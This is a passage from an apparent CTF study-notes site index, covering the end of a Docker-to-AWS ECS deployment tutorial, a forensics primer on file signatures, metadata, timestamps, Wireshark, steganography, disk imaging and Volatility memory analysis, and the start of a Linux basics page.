CLI tool that understands Docker Compose files and automatically provisions the cluster on ECS! Since we already have a functioning <code>docker-compose.yml</code> it should not take a lot of effort in getting up and running on AWS. So let's get started!</p> <p>The first step is to install the CLI. Instructions to install the CLI on both Mac and Linux are explained very clearly in the official docs. Go ahead, install the CLI and when you are done, verify the install by running</p> <pre><code>$ ecs-cli --version\necs-cli version 1.18.1 (7e9df84)\n</code></pre> <p>Next, we'll be working on configuring the CLI so that we can talk to ECS. We'll be following the steps as detailed in the official guide on AWS ECS docs. In case of any confusion, please feel free to refer to that guide.</p> <p>The first step will involve creating a profile that we'll use for the rest of the tutorial. To continue, you'll need your <code>AWS_ACCESS_KEY_ID</code> and <code>AWS_SECRET_ACCESS_KEY</code>. To obtain these, follow the steps as detailed under the section titled Access Key and Secret Access Key on this page.</p> <pre><code>$ ecs-cli configure profile --profile-name ecs-foodtrucks --access-key $AWS_ACCESS_KEY_ID --secret-key $AWS_SECRET_ACCESS_KEY\n</code></pre> <p>Next, we need to get a keypair which we'll be using to log into the instances. Head over to your EC2 Console and create a new keypair. Download the keypair and store it in a safe location. Another thing to note before you move away from this screen is the region name. In my case, I have named my key - <code>ecs</code> and set my region as <code>us-east-1</code>. This is what I'll assume for the rest of this walkthrough.</p> <p></p> <p>The next step is to configure the CLI.</p> <pre><code>$ ecs-cli configure --region us-east-1 --cluster foodtrucks\nINFO[0000] Saved ECS CLI configuration for cluster (foodtrucks)\n</code></pre> <p>We provide the <code>configure</code> command with the region name we want our cluster to reside in and a cluster name. Make sure you provide the same region name that you used when creating the keypair. If you've not configured the AWS CLI on your computer before, you can use the official guide, which explains everything in great detail on how to get everything going.</p> <p>The next step enables the CLI to create a CloudFormation template.</p> <pre><code>$ ecs-cli up --keypair ecs --capability-iam --size 1 --instance-type t2.medium\nINFO[0000] Using recommended Amazon Linux 2 AMI with ECS Agent 1.39.0 and Docker version 18.09.9-ce\nINFO[0000] Created cluster                               cluster=foodtrucks\nINFO[0001] Waiting for your cluster resources to be created\nINFO[0001] Cloudformation stack status                   stackStatus=CREATE_IN_PROGRESS\nINFO[0062] Cloudformation stack status                   stackStatus=CREATE_IN_PROGRESS\nINFO[0122] Cloudformation stack status                   stackStatus=CREATE_IN_PROGRESS\nINFO[0182] Cloudformation stack status                   stackStatus=CREATE_IN_PROGRESS\nINFO[0242] Cloudformation stack status                   stackStatus=CREATE_IN_PROGRESS\nVPC created: vpc-0bbed8536930053a6\nSecurity Group created: sg-0cf767fb4d01a3f99\nSubnet created: subnet-05de1db2cb1a50ab8\nSubnet created: subnet-01e1e8bc95d49d0fd\nCluster creation succeeded.\n</code></pre> <p>Here we provide the name of the keypair we downloaded initially (<code>ecs</code> in my case), the number of instances that we want to use (<code>--size</code>) and the type of instances that we want the containers to run on. The <code>--capability-iam</code> flag tells the CLI that we acknowledge that this command may create IAM resources.</p> <p>The last and final step is where we'll use our <code>docker-compose.yml</code> file. We'll need to make a few minor changes, so instead of modifying the original, let's make a copy of it. The contents of this file (after making the changes) look like (below) -</p> <pre><code>version: '2'\nservices:\n  es:\n    image: docker.elastic.co/elasticsearch/elasticsearch:7.6.2\n    cpu_shares: 100\n    mem_limit: 3621440000\n    environment:\n      - discovery.type=single-node\n      - bootstrap.memory_lock=true\n      - \"ES_JAVA_OPTS=-Xms512m -Xmx512m\"\n    logging:\n      driver: awslogs\n      options:\n        awslogs-group: foodtrucks\n        awslogs-region: us-east-1\n        awslogs-stream-prefix: es\n  web:\n    image: yourusername/foodtrucks-web\n    cpu_shares: 100\n    mem_limit: 262144000\n    ports:\n      - \"80:5000\"\n    links:\n      - es\n    logging:\n      driver: awslogs\n      options:\n        awslogs-group: foodtrucks\n        awslogs-region: us-east-1\n        awslogs-stream-prefix: web\n</code></pre> <p>The only changes we made from the original <code>docker-compose.yml</code> are of providing the <code>mem_limit</code> (in bytes) and <code>cpu_shares</code> values for each container and adding some logging configuration. This allows us to view logs generated by our containers in AWS CloudWatch. Head over to CloudWatch to create a log group called <code>foodtrucks</code>. Note that since ElasticSearch typically ends up taking more memory, we've given around 3.4 GB of memory limit. Another thing we need to do before we move onto the next step is to publish our image on Docker Hub.</p> <pre><code>$ docker push yourusername/foodtrucks-web\n</code></pre> <p>Great! Now let's run the final command that will deploy our app on ECS!</p> <pre><code>$ cd aws-ecs\n$ ecs-cli compose up\nINFO[0000] Using ECS task definition                     TaskDefinition=ecscompose-foodtrucks:2\nINFO[0000] Starting container...                         container=845e2368-170d-44a7-bf9f-84c7fcd9ae29/es\nINFO[0000] Starting container...                         container=845e2368-170d-44a7-bf9f-84c7fcd9ae29/web\nINFO[0000] Describe ECS container status                 container=845e2368-170d-44a7-bf9f-84c7fcd9ae29/web desiredStatus=RUNNING lastStatus=PENDING taskDefinition=ecscompose-foodtrucks:2\nINFO[0000] Describe ECS container status                 container=845e2368-170d-44a7-bf9f-84c7fcd9ae29/es desiredStatus=RUNNING lastStatus=PENDING taskDefinition=ecscompose-foodtrucks:2\nINFO[0036] Describe ECS container status                 container=845e2368-170d-44a7-bf9f-84c7fcd9ae29/es desiredStatus=RUNNING lastStatus=PENDING taskDefinition=ecscompose-foodtrucks:2\nINFO[0048] Describe ECS container status                 container=845e2368-170d-44a7-bf9f-84c7fcd9ae29/web desiredStatus=RUNNING lastStatus=PENDING taskDefinition=ecscompose-foodtrucks:2\nINFO[0048] Describe ECS container status                 container=845e2368-170d-44a7-bf9f-84c7fcd9ae29/es desiredStatus=RUNNING lastStatus=PENDING taskDefinition=ecscompose-foodtrucks:2\nINFO[0060] Started container...                          container=845e2368-170d-44a7-bf9f-84c7fcd9ae29/web desiredStatus=RUNNING lastStatus=RUNNING taskDefinition=ecscompose-foodtrucks:2\nINFO[0060] Started container...                          container=845e2368-170d-44a7-bf9f-84c7fcd9ae29/es desiredStatus=RUNNING lastStatus=RUNNING taskDefinition=ecscompose-foodtrucks:2\n</code></pre> <p>It's not a coincidence that the invocation above looks similar to the one we used with Docker Compose. If everything went well, you should see a <code>desiredStatus=RUNNING lastStatus=RUNNING</code> as the last line.</p> <p>Awesome! Our app is live, but how can we access it?</p> <pre><code>ecs-cli ps\nName                                      State    Ports                     TaskDefinition\n845e2368-170d-44a7-bf9f-84c7fcd9ae29/web  RUNNING  54.86.14.14:80-&gt;5000/tcp  ecscompose-foodtrucks:2\n845e2368-170d-44a7-bf9f-84c7fcd9ae29/es   RUNNING                            ecscompose-foodtrucks:2\n</code></pre> <p>Go ahead and open http://54.86.14.14 in your browser and you should see the Food Trucks in all its black-yellow glory! Since we're on the topic, let's see how our AWS ECS console looks.</p> <p> </p> <p></p> <p>We can see above that our ECS cluster called 'foodtrucks' was created and is now running 1 task with 2 container instances. Spend some time browsing this console to get a hang of all the options that are here.</p>"},{"location":"CTF/Docker/#cleanup_1","title":"Cleanup","text":"<p>Once you've played around with the deployed app, remember to turn down the cluster -</p> <pre><code>$ ecs-cli down --force\nINFO[0001] Waiting for your cluster resources to be deleted...\nINFO[0001] Cloudformation stack status                   stackStatus=DELETE_IN_PROGRESS\nINFO[0062] Cloudformation stack status                   stackStatus=DELETE_IN_PROGRESS\nINFO[0124] Cloudformation stack status                   stackStatus=DELETE_IN_PROGRESS\nINFO[0155] Deleted cluster                               cluster=foodtrucks\n</code></pre> <p>So there you have it. With just a few commands we were able to deploy our awesome app on the AWS cloud!</p>"},{"location":"CTF/Docker/#conclusion","title":"CONCLUSION","text":"<p>And that's a wrap! After a long, exhaustive but fun tutorial you are now ready to take the container world by storm! If you followed along till the very end then you should definitely be proud of yourself. You learned how to setup Docker, run your own containers, play with static and dynamic websites and most importantly got hands on experience with deploying your applications to the cloud!</p> <p>I hope that finishing this tutorial makes you more confident in your abilities to deal with servers. When you have an idea of building your next app, you can be sure that you'll be able to get it in front of people with minimal effort.</p>"},{"location":"CTF/Docker/#next-steps","title":"Next Steps","text":"<p>Your journey into the container world has just started! My goal with this tutorial was to whet your appetite and show you the power of Docker. In the sea of new technology, it can be hard to navigate the waters alone and tutorials such as this one can provide a helping hand. This is the Docker tutorial I wish I had when I was starting out. Hopefully, it served its purpose of getting you excited about containers so that you no longer have to watch the action from the sides.</p> <p>Below are a few additional resources that will be beneficial. For your next project, I strongly encourage you to use Docker. Keep in mind - practice makes perfect!</p> <p>Additional Resources</p> <ul> <li>Awesome Docker</li> <li>Why Docker</li> <li>Docker Weekly and archives</li> <li>Codeship Blog</li> </ul> <p>Off you go, young padawan!</p>"},{"location":"CTF/Docker/#give-feedback","title":"Give Feedback","text":"<p>Now that the tutorial is over, it's my turn to ask questions. How did you like the tutorial? Did you find the tutorial to be a complete mess or did you have fun and learn something?</p> <p>Send in your thoughts directly to me or just create an issue. I'm on Twitter, too, so if that's your deal, feel free to holler there!</p> <p>I would totally love to hear about your experience with this tutorial. Give suggestions on how to make this better or let me know about my mistakes. I want this tutorial to be one of the best introductory tutorials on the web and I can't do it without your help.</p>"},{"location":"CTF/Forensics/","title":"Forensics","text":"<p>https://ctf101.org/forensics</p> <p>Forensics is the art of recovering the digital trail left on a computer. There are plenty of methods to find data that is seemingly deleted, not stored, or worse, covertly recorded.</p> <p>An important part of Forensics is having the right tools, as well as being familiar with the following topics:</p> <ul> <li>File Formats</li> <li>EXIF data</li> <li>Wireshark &amp; PCAPs</li> <li>What is Wireshark</li> <li>Steganography</li> <li>Disk Imaging</li> </ul>"},{"location":"CTF/Forensics/#file-formats","title":"File Formats","text":"<p>File Extensions are not the sole way to identify the type of a file, files have certain leading bytes called file signatures which allow programs to parse the data consistently. Files can also contain additional \"hidden\" data called metadata which can be useful in finding out information about the context of a file's data.</p>"},{"location":"CTF/Forensics/#file-signatures","title":"File Signatures","text":"<p>File signatures (also known as File Magic Numbers) are bytes within a file used to identify the format of the file. Generally, they\u2019re 2-4 bytes long, found at the beginning of a file.</p>"},{"location":"CTF/Forensics/#what-is-it-used-for","title":"What is it used for?","text":"<p>Files can sometimes come without an extension, or with incorrect ones. We use file signature analysis to identify the format (file type) of the file. Programs need to know the file type to open properly.</p>"},{"location":"CTF/Forensics/#how-do-you-find-the-file-signature","title":"How do you find the file signature?","text":"<p>You need to be able to look at the binary data that constitutes the file you\u2019re examining. To do this, you\u2019ll use a hexadecimal editor. Once you find the file signature, you can check it against file signature repositories such as Gary Kessler\u2019s.</p>"},{"location":"CTF/Forensics/#example","title":"Example","text":"<p>The file above, when opened in a Hex Editor, begins with the bytes <code>FFD8FFE0 00104A46 494600</code> or in ASCII <code>\u02c7\u00ff\u02c7\u2021 JFIF</code> where <code>\\x00</code> and <code>\\x10</code> lack symbols.</p> <p>Searching in Gary Kessler\u2019s database shows that this file signature belongs to a <code>JPEG/JFIF graphics file</code>, exactly what we suspect.</p>"},{"location":"CTF/Forensics/#metadata","title":"Metadata","text":"<p>Metadata is data about data. Different types of files have different metadata. The metadata on a photo could include dates, camera information, GPS location, comments, etc. For music, it could include the title, author, track number, and album.</p>"},{"location":"CTF/Forensics/#what-kind-of-file-metadata-is-useful","title":"What kind of file metadata is useful?","text":"<p>Potentially, any file metadata you can find could be useful.</p>"},{"location":"CTF/Forensics/#how-do-i-find-it","title":"How do I find it?","text":"<p>EXIF Data is metadata attached to photos which can include location, time, and device information.</p> <p>One of our favorite tools is ExifTool, which displays metadata for an input file, including: - File size - Dimensions (width and height) - File type - Programs used to create (e.g. Photoshop) - OS used to create (e.g. Apple)</p> <p>Run command line: <code>exiftool(-k).exe [filename]</code> and you should see something like this:</p> <p></p>"},{"location":"CTF/Forensics/#example_1","title":"Example","text":"<p>Let's take a look at File A's metadata with ExifTool:</p> <p>File type</p> <p></p> <p>Image description</p> <p></p> <p>Make and camera info</p> <p></p> <p>GPS Latitude/Longitude</p> <p></p>"},{"location":"CTF/Forensics/#timestamps","title":"Timestamps","text":"<p>Timestamps are data that indicate the time of certain events (MAC): - Modification \u2013 when a file was modified - Access \u2013 when a file or entries were read or accessed - Creation \u2013 when files or entries were created</p>"},{"location":"CTF/Forensics/#types-of-timestamps","title":"Types of timestamps","text":"<ul> <li>Modified</li> <li>Accessed</li> <li>Created</li> <li>Date Changed (MFT)</li> <li>Filename Date Created (MFT)</li> <li>Filename Date Modified (MFT)</li> <li>Filename Date Accessed (MFT)</li> <li>INDX Entry Date Created</li> <li>INDX Entry Date Modified</li> <li>INDX Entry Date Accessed</li> <li>INDX Entry Date Changed</li> </ul>"},{"location":"CTF/Forensics/#why-do-we-care","title":"Why do we care?","text":"<p>Certain events such as creating, moving, copying, opening, editing, etc. might affect the MAC times. If the MAC timestamps can be attained, a timeline of events could be created.</p>"},{"location":"CTF/Forensics/#timeline-patterns","title":"Timeline Patterns","text":"<p>There are plenty more patterns than the ones introduced below, but these are the basics you should start with to get a good understanding of how it works, and to complete this challenge.</p> <p> </p>"},{"location":"CTF/Forensics/#examples","title":"Examples","text":"<p>We know that the BMP files fileA and fileD are the same, but that the JPEG files fileB and fileC are different somehow. So how can we find out what went on with these files?</p> <p></p> <p>By using time stamp information from the file system, we can learn that the BMP fileD was the original file, with fileA being a copy of the original. Afterward, fileB was created by modifying fileB, and fileC was created by modifying fileA differently.</p> <p>Follow along as we demonstrate.</p> <p>We\u2019ll start by analyzing images in AccessData FTK Imager, where there\u2019s a Properties window that shows you some information about the file or folder you\u2019ve selected.</p> <p> </p> <p>Here are the extracted MAC times for fileA, fileB, fileC, and fileD: Note, AccessData FTK Imager assumes that the file times on the drive are in UTC (Universal Coordinated Time). I subtracted four hours since the USB was set up in Eastern Standard Time. This isn\u2019t necessary, but it helps me understand the times a bit better.</p> <p></p> <p>Highlight timestamps that are the same, if timestamps are off by a few seconds, they should be counted as the same. This lets you see a clear difference between different timestamps. Then, highlight oldest to newest to help put them in order.</p> <p> </p> <p>Identify timestamp patterns.</p> <p></p>"},{"location":"CTF/Forensics/#wireshark","title":"Wireshark","text":"<p>Wireshark is a network protocol analyzer that is often used in CTF challenges to look at recorded network traffic. Wireshark uses a file type called PCAP to record traffic. PCAPs are often distributed in CTF challenges to provide recorded traffic history.</p>"},{"location":"CTF/Forensics/#interface","title":"Interface","text":"<p>Upon opening Wireshark, you are greeted with the option to open a PCAP or begin capturing network traffic on your device.</p> <p></p> <p>The network traffic displayed initially shows the packets in the order in which they were captured. You can filter packets by protocol, source IP address, destination IP address, length, etc.</p> <p></p> <p>To apply filters, simply enter the constraining factor, for example, 'http', in the display filter bar.</p> <p></p> <p>Filters can be chained together using the '&amp;&amp;' notation. To filter by IP, ensure a double equals '==' is used.</p> <p></p> <p>The most pertinent part of a packet is its data payload and protocol information.</p> <p></p>"},{"location":"CTF/Forensics/#decrypting-ssl-traffic","title":"Decrypting SSL Traffic","text":"<p>By default, Wireshark cannot decrypt SSL traffic on your device unless you grant it specific certificates.</p>"},{"location":"CTF/Forensics/#high-level-ssl-handshake-overview","title":"High-Level SSL Handshake Overview","text":"<p>For a network session to be encrypted properly, the client and server must share a common secret that they can use to encrypt and decrypt data without someone in the middle being able to guess. The SSL Handshake loosely follows this format:</p> <ol> <li>The client sends a list of available cipher suites it can use along with a random set of bytes referred to as client_random</li> <li>The server sends back the cipher suite that will be used, such as TLS_DHE_RSA_WITH_AES_128_CBC_SHA, along with a random set of bytes referred to as server_random</li> <li>The client generates a pre-master secret, encrypts it, then sends it to the server.</li> <li>The server and client then generate a common master secret using the selected cipher suite</li> <li>The client and server begin communicating using this common secret</li> </ol>"},{"location":"CTF/Forensics/#decryption-requirements","title":"Decryption Requirements","text":"<p>There are several ways to be able to decrypt traffic.</p> <ul> <li>If you have the client and server random values and the pre-master secret, the master secret can be generated and used to decrypt the traffic</li> <li>If you have the master secret, traffic can be decrypted easily</li> <li>If the cipher-suite uses RSA, you can factor n in the key to break the encryption on the encrypted pre-master secret and generate the master secret with the client and server randoms</li> </ul> <p></p>"},{"location":"CTF/Forensics/#steganography","title":"Steganography","text":"<p>Steganography is the practice of hiding data in plain sight. Steganography is often embedded in images or audio.</p> <p>You could send a picture of a cat to a friend and hide text inside. Looking at the image, there\u2019s nothing to make anyone think there\u2019s a message hidden inside it.</p> <p></p> <p>You could also hide a second image inside the first.</p> <p></p>"},{"location":"CTF/Forensics/#steganography-detection","title":"Steganography Detection","text":"<p>So we can hide text and an image, how do we find out if there is hidden data?</p> <p></p> <p>FileA and FileD appear the same, but they\u2019re different. Also, FileD was modified after it was copied, so it\u2019s possible there might be steganography in it.</p> <p>FileB and FileC don\u2019t appear to have been modified after being created. That doesn\u2019t rule out the possibility that there\u2019s steganography in them, but you\u2019re more likely to find it in fileD. This brings up two questions:</p> <ol> <li>Can we determine that there is steganography in fileD?</li> <li>If there is, what was hidden in it?</li> </ol>"},{"location":"CTF/Forensics/#lsb-steganography","title":"LSB Steganography","text":"<p>Files are made of bytes. Each byte is composed of eight bits.</p> <p></p> <p>Changing the least-significant bit (LSB) doesn\u2019t change the value very much.</p> <p></p> <p>So we can modify the LSB without changing the file noticeably. By doing so, we can hide a message inside.</p>"},{"location":"CTF/Forensics/#lsb-steganography-in-images","title":"LSB Steganography in Images","text":"<p>LSB Stegonagraphy or Least Significant Bit Stegonagraphy is a method of steganography where data is recorded in the lowest bit of a byte.</p> <p>Say an image has a pixel with an RGB value of (255, 255, 255), the bits of those RGB values will look like</p> 1 1 1 1 1 1 1 1 <p>By modifying the lowest, or least significant, bit, we can use the 1-bit space across every RGB value for every pixel to construct a message.</p> 1 1 1 1 1 1 1 0 <p>The reason steganography is hard to detect by sight is that a 1-bit difference in color is insignificant as seen below.</p> <p></p>"},{"location":"CTF/Forensics/#example_2","title":"Example","text":"<p>Let\u2019s say we have an image, and part of it contains the following binary:</p> <p></p> <p>And let\u2019s say we want to hide the character y inside.</p> <p>First, we need to convert the hidden message to binary.</p> <p></p> <p>Now we take each bit from the hidden message and replace the LSB of the corresponding byte with it.</p> <p></p> <p>And again:</p> <p></p> <p>And again:</p> <p></p> <p>And again:</p> <p></p> <p>And again:</p> <p></p> <p>And again:</p> <p></p> <p>And again:</p> <p></p> <p>And once more:</p> <p></p> <p>Decoding LSB steganography is exactly the same as encoding, but in reverse. For each byte, grab the LSB and add it to your decoded message. Once you\u2019ve gone through each byte, convert all the LSBs you grabbed into text or a file. (You can use your file signature knowledge here!)</p>"},{"location":"CTF/Forensics/#what-other-types-of-steganography-are-there","title":"What other types of steganography are there?","text":"<p>Steganography is hard for the defense side because there\u2019s practically an infinite number of ways it could be carried out. Here are a few examples: - LSB steganography: different bits, different bit combinations - Encode in every certain number of bytes - Use a password - Hide in different places - Use encryption on top of steganography.</p>"},{"location":"CTF/Forensics/#disk-imaging","title":"Disk Imaging","text":"<p>A forensic image is an electronic copy of a drive (e.g. a hard drive, USB, etc.). It\u2019s a bit-by-\u00adbit or bitstream file that\u2019s an exact, unaltered copy of the media being duplicated.</p> <p>Wikipedia said that the most straight\u00adforward disk imaging method is to read a disk from start to finish and write the data to a forensics image format. \u201cThis can be a time-consuming process, especially for disks with a large capacity,\u201d Wikipedia said.</p> <p>To prevent write access to the disk, you can use a write blocker. It\u2019s also common to calculate a cryptographic hash of the entire disk when imaging it. \u201cCommonly-used cryptographic hashes are MD5, SHA1, and/or SHA256,\u201d said Wikipedia. \u201cBy recalculating the integrity hash at a later time, one can determine if the data in the disk image has been changed. This by itself does not protect against intentional tampering, but it can indicate that the data was altered, e.g. due to corruption.\u201d</p> <p>Why image a disk? Forensic imaging: - Prevents tampering with the original data\u00ad evidence - Allows you to play around with the copy, without worrying about messing up the original</p>"},{"location":"CTF/Forensics/#forensic-image-extraction-example","title":"Forensic Image Extraction Example","text":"<p>This example uses the tool AccessData FTK Imager.</p> <p>Step 1: Go to <code>File &gt; Create Disk Image</code></p> <p></p> <p>Step 2: Select <code>Physical Drive</code>, because the USB or hard drive you\u2019re imaging is a physical device or drive.</p> <p></p> <p>Step 3: Select the drive you\u2019re imaging. The 1000 GB is my computer hard drive; the 128 MB is the USB that I want to image.</p> <p></p> <p>Step 4: Add a new image destination</p> <p></p> <p>Step 5: Select whichever image type you want. Choose <code>Raw (dd)</code> if you\u2019re a beginner, since it\u2019s the most common type</p> <p></p> <p>Step 6: Fill in all the evidence information</p> <p></p> <p>Step 7: Choose where you want to store it</p> <p></p> <p>Step 8: The image destination has been added. Now you can start the image extraction</p> <p></p> <p>Step 9: Wait for the image to be extracted</p> <p></p> <p>Step 10: This is the completed extraction</p> <p></p> <p>Step 11: Add the image you just created so that you can view it</p> <p></p> <p>Step 12: This time, choose the image file, since that\u2019s what you just created</p> <p></p> <p>Step 13: Enter the path of the image you just created</p> <p></p> <p>Step 14: View the image.</p> <ol> <li>Evidence tree Structure of the drive image</li> <li>File list List of all the files in the drive image folder</li> <li>Properties Properties of the file/folder being examined</li> <li>Hex viewer View of the drive/folders/files in hexadecimal</li> </ol> <p></p> <p>Step 15: To view files in the USB, go to <code>Partition 1 &gt; [USB name] &gt; [root]</code> in the Evidence Tree and look in the File List</p> <p></p> <p>Step 16: Selecting fileA, fileB, fileC, or fileD gives us some properties of the files &amp; a preview of each photo</p> <p></p> <p>Step 17: Extract files of interest for further analysis by selecting, right-clicking, and choosing <code>Export Files</code></p> <p></p>"},{"location":"CTF/Forensics/#memory-forensics","title":"Memory Forensics","text":"<p>There are plenty of traces of someone's activity on a computer, but perhaps some of the most valuable information can be found within memory dumps, that is images taken of RAM. These dumps of data are often very large but can be analyzed using a tool called Volatility</p>"},{"location":"CTF/Forensics/#volatility-basics","title":"Volatility Basics","text":"<p>Memory forensics isn't all that complicated, the hardest part would be using your toolset correctly. A good workflow is as follows:</p> <ol> <li>Run <code>strings</code> for clues</li> <li>Identify the image profile (which OS, version, etc.)</li> <li>Dump processes and look for suspicious processes</li> <li>Dump data related interesting processes</li> <li>View data in a format relating to the process (Word: docx, Notepad: txt, Photoshop: psd, etc.)</li> </ol>"},{"location":"CTF/Forensics/#profile-identification","title":"Profile Identification","text":"<p>To properly use Volatility you must supply a profile with <code>--profile=PROFILE</code>, therefore before any sleuthing, you need to determine the profile using imageinfo:</p> <pre><code>$ python vol.py -f ~/image.raw imageinfo\nVolatility Foundation Volatility Framework 2.4\nDetermining profile based on KDBG search...\n\n          Suggested Profile(s) : Win7SP0x64, Win7SP1x64, Win2008R2SP0x64, Win2008R2SP1x64\n                     AS Layer1 : AMD64PagedMemory (Kernel AS)\n                     AS Layer2 : FileAddressSpace (/Users/Michael/Desktop/win7_trial_64bit.raw)\n                      PAE type : PAE\n                           DTB : 0x187000L\n                          KDBG : 0xf80002803070\n          Number of Processors : 1\n     Image Type (Service Pack) : 0\n                KPCR for CPU 0 : 0xfffff80002804d00L\n             KUSER_SHARED_DATA : 0xfffff78000000000L\n           Image date and time : 2012-02-22 11:29:02 UTC+0000\n     Image local date and time : 2012-02-22 03:29:02 -0800\n</code></pre>"},{"location":"CTF/Forensics/#dump-processes","title":"Dump Processes","text":"<p>To view processes, the <code>pslist</code> or <code>pstree</code>, or <code>psscan</code> command can be used.</p> <pre><code>$ python vol.py -f ~/image.raw pslist --profile=Win7SP0x64 pstree\nVolatility Foundation Volatility Framework 2.5\nOffset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit\n------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------\n0xffffa0ee12532180 System                    4      0    108        0 ------      0 2018-04-22 20:02:33 UTC+0000\n0xffffa0ee1389d040 smss.exe                232      4      3        0 ------      0 2018-04-22 20:02:33 UTC+0000\n...\n0xffffa0ee128c6780 VBoxTray.exe           3324   1123     10        0      1      0 2018-04-22 20:02:55 UTC+0000\n0xffffa0ee14108780 OneDrive.exe           1422   1123     10        0      1      1 2018-04-22 20:02:55 UTC+0000\n0xffffa0ee14ade080 svchost.exe             228    121      1        0      1      0 2018-04-22 20:14:43 UTC+0000\n0xffffa0ee1122b080 notepad.exe            2019   1123      1        0      1      0 2018-04-22 20:14:49 UTC+0000\n</code></pre>"},{"location":"CTF/Forensics/#process-memory-dump","title":"Process Memory Dump","text":"<p>Dumping the memory of a process can prove to be fruitful, say we want to dump the data from notepad.exe:</p> <pre><code>$ python vol.py -f ~/image.raw --profile=Win7SP0x64 memdump -p 2019 -D dump/\nVolatility Foundation Volatility Framework 2.4\n************************************************************************\nWriting System [     2019] to 2019.dmp\n\n$ ls -alh dump/2019.dmp\n-rw-r--r--  1 user  staff   111M Apr 22 20:47 dump/2019.dmp\n</code></pre>"},{"location":"CTF/Forensics/#other-useful-commands","title":"Other Useful Commands","text":"<p>There are plenty of commands that Volatility offers but some highlights include:</p> <ul> <li><code>$ python vol.py -f IMAGE --profile=PROFILE connections</code>: view network connections</li> <li><code>$ python vol.py -f IMAGE --profile=PROFILE cmdscan</code>: view commands that were run in cmd prompt</li> </ul>"},{"location":"CTF/Forensics/#hex-editor","title":"Hex Editor","text":"<p>A hexadecimal (hex) editor (also called a binary file editor or byte editor) is a computer program you can use to manipulate the fundamental binary data that constitutes a computer file. The name \u201chex\u201d comes from \u201chexadecimal,\u201d a standard numerical format for representing binary data. A typical computer file occupies multiple areas on the platter(s) of a disk drive, whose contents are combined to form the file. Hex editors that are designed to parse and edit sector data from the physical segments of floppy or hard disks are sometimes called sector editors or disk editors. A hex editor is used to see or edit the raw, exact contents of a file. Hex editors may be used to correct data corrupted by a system or application. A list of editors can be found on the forensics Wiki. You can download one and install it on your system.</p>"},{"location":"CTF/Forensics/#example_3","title":"Example","text":"<p>Open fileA.jpg in a hex editor. (Most Hex editors have either a \u201cFile &gt; Open\u201d option or a simple drag and drop.)</p> <p></p> <p>When you open fileA.jpg in your hex editor, you should see something similar to this:</p> <p></p> <p>Your hex editor should also have a \u201cgo to\u201d or \u201cfind\u201d feature so you can jump to a specific byte.</p>"},{"location":"CTF/Linux%20Basics/","title":"Linux OS Installation and Basics","text":"<p>https://linuxtools-rst.readthedocs.io/zh_CN/latest/base/index.html</p> <p>https://www.tutorialspoint.com/unix/index.htm</p> <p>https://www.digitalocean.com/community/tutorials/an-introduction-to-linux-basics</p>"},{"location":"CTF/Linux%20Basics/#what-is-unix","title":"What is Unix ?","text":"<p>The Unix operating system is a set of programs that act as a link between the computer and the user.</p> <p>The computer programs that allocate the system resources and coordinate all the details of the computer's internals are called the operating system or the kernel.</p> <p>Users communicate with the kernel through a program known as the shell. The shell is a command line interpreter; it translates commands entered by the user and converts them into a language that is understood by the kernel.</p> <ul> <li>Unix was originally developed in 1969 by a group of AT&amp;T employees Ken Thompson, Dennis Ritchie, Douglas McIlroy, and Joe Ossanna at Bell Labs.</li> <li>There are various Unix variants available in the market. Solaris Unix, AIX, HP Unix, and BSD are a few examples. Linux is also a freely available flavor of Unix.</li> <li>Several people can use a Unix computer at the same time; hence Unix is called a multiuser system.</li> <li>A user can also run multiple programs at the same time; hence Unix is a multitasking environment.</li> </ul>"},{"location":"CTF/Linux%20Basics/#prerequisites","title":"Prerequisites","text":"<p>To follow along with this guide, you will need access to a computer running a Linux-based operating system. This can either be a virtual private server that you\u2019ve connected to with SSH or your local machine. Note that this tutorial was validated using a Linux server running Ubuntu 20.04, but the examples given should work on a computer running any version of any Linux distribution.</p> <p>If you plan to use a remote server to follow this guide, we encourage you to first complete our Initial Server Setup guide. Doing so will set you up with a secure server environment \u2014 including a non-root user with <code>sudo</code> privileges and a firewall configured with UFW \u2014 which you can use to build your Linux skills.</p>"},{"location":"CTF/Linux%20Basics/#the-terminal","title":"The Terminal","text":"<p>The terms \u201cterminal,\u201d \u201cshell,\u201d and \u201ccommand line interface\u201d are often used interchangeably, but there are subtle differences between them:</p> <ul> <li>A terminal is an input and output environment that presents a text-only window running a shell.</li> <li>A shell is a program that exposes the computer\u2019s operating system to a user or program. In Linux systems, the shell presented in a terminal is a command line interpreter.</li> <li>A command line interface is a user interface (managed by a command line interpreter program) that processes commands to a computer program and outputs the results.</li> </ul> <p>When someone refers to one of these three terms in the context of Linux, they generally mean a terminal environment where you can run commands and see the results printed out to the terminal, such as this:</p> <p></p> <p>Becoming a Linux expert requires you to be comfortable with using a terminal. Any administrative task, including file manipulation, package installation, and user management, can be accomplished through the terminal. The terminal is interactive: you specify commands to run and the terminal outputs the results of those commands. To execute any command, you type it into the prompt and press <code>ENTER</code>.</p> <p>When accessing a cloud server, you\u2019ll most often be doing so through a terminal shell. Although personal computers that run Linux often come with the kind of graphical desktop environment familiar to most computer users, it is often more efficient or practical to perform certain tasks through commands entered into the terminal.</p>"},{"location":"CTF/Linux%20Basics/#learn-to-use-command-help","title":"Learn to use command help","text":""},{"location":"CTF/Linux%20Basics/#overview","title":"Overview","text":"<p>In the linux terminal, when we don't know how to use a command, or don't remember the spelling of a command or its parameters, we need to turn to the system's help documentation; the built-in help documentation in linux is very detailed and usually solves our problems, so we need to know how to use it properly.</p> <ul> <li>in cases where we only remember some of the command keywords, we can search for them by using man -k.</li> <li>needing a brief description of a command, we can use what is; for a more detailed description, we can use the info command.</li> <li>to see where the command is located, we need to use which.</li> <li>and for the specific parameters of a command and how to use it, we need to use the powerful man.</li> </ul> <p>These commands are described below.</p>"},{"location":"CTF/Linux%20Basics/#command-usage","title":"Command usage","text":""},{"location":"CTF/Linux%20Basics/#view-a-brief-description-of-the-command","title":"View a brief description of the command","text":"<p>A brief description of what the command does (showing the man category page where the command is located):</p> <pre><code>$whatis command\n</code></pre> <p>Regular match:</p> <pre><code>$whatis -w \"loca*\"\n</code></pre> <p>More detailed documentation:</p> <pre><code>$info command\n</code></pre>"},{"location":"CTF/Linux%20Basics/#using-man","title":"Using man","text":"<p>Query the documentation for the command command:</p> <pre><code>$man command\neg: man date\n</code></pre> <p>Using page up and page down to page up and down</p> <p>In the man help manual, the help documentation is divided into 9 categories, for some keywords that may exist in more than one category, we need to specify a specific category to view; (generally, we query the bash command, categorized in category 1).</p> <p>man page belongs to the category 